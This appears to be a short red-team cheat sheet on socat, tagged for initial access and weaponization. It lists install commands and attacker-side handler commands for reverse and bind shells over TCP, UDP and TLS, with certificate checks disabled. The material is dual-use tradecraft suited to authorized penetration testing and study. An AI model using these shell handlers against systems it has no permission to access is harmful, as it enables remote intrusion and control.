---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - cross-platform
  - socat
---
# Socat

## 01 - Setup

Install `socat` according to your package manager.

```
$ sudo apt install -y socat

$ sudo dnf install -y socat

$ sudo pacman -S --noconfirm socat
```

Checking a remote connection with verbosed debug.

```
$ socat -dddd - tcp4:<remote_IP>:<remote_PORT>
```

> [!NOTE]
> Using root privileges to bind a listener to ports below 1024.

## 02 - Reverse Shell Handler

### 2.1 - TCP Method

```
$ socat FILE:`tty`,raw,echo=0 TCP-LISTEN:<PORT>

$ socat -d -d TCP4-LISTEN:443 STDOUT
```

## 03 - Bind Shell Handler

### 3.1 - TCP Method

```
$ socat FILE:`tty`,raw,echo=0 TCP:<target_IP>:<target_PORT>
```

### 3.2 - UDP Method

```
$ socat FILE:`tty`,raw,echo=0 UDP:<target_IP>:<target_PORT>
```

### 3.3 - TLS Method

```
$ socat - OPENSSL:<target_IP>:<target_PORT>,verify=0
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Implant/Cross Platform/Payloads/One-Liners/Netcat Variants/Socat]]